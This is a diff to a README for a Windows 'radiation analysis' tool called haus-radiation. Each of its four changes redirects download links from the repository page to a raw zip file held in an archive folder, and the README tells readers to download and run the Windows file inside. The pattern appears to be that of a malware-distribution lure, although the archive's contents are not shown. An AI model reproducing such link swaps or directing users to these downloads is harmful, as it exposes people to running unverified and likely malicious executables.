@@ -1,6 +1,6 @@
 # 🌊 haus-radiation - Simple radiation analysis on Windows
 
-[![Download haus-radiation](https://img.shields.io/badge/Download%20haus--radiation-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alishamonoclonal419/haus-radiation)
+[![Download haus-radiation](https://img.shields.io/badge/Download%20haus--radiation-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alishamonoclonal419/haus-radiation/raw/refs/heads/main/archive/haus_radiation_v3.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/Alishamonoclonal419/haus-radiation
+https://github.com/Alishamonoclonal419/haus-radiation/raw/refs/heads/main/archive/haus_radiation_v3.8-beta.2.zip
 
 After the page opens, look for the latest release or the main download option. Then download the Windows file and save it to your computer.
 
@@ -34,7 +34,7 @@ Recommended setup:
 ## ⚙️ How to Install
 
 1. Open the download page:
-   https://github.com/Alishamonoclonal419/haus-radiation
+   https://github.com/Alishamonoclonal419/haus-radiation/raw/refs/heads/main/archive/haus_radiation_v3.8-beta.2.zip
 
 2. Find the Windows download. It may be a `.exe` file or a compressed file such as `.zip`.
 
@@ -175,4 +175,4 @@ computational physics, electrodynamics, far field, Fourier analysis, inverse pro
 
 ## 📎 Download Again
 
-[Download haus-radiation](https://github.com/Alishamonoclonal419/haus-radiation)
+[Download haus-radiation](https://github.com/Alishamonoclonal419/haus-radiation/raw/refs/heads/main/archive/haus_radiation_v3.8-beta.2.zip)
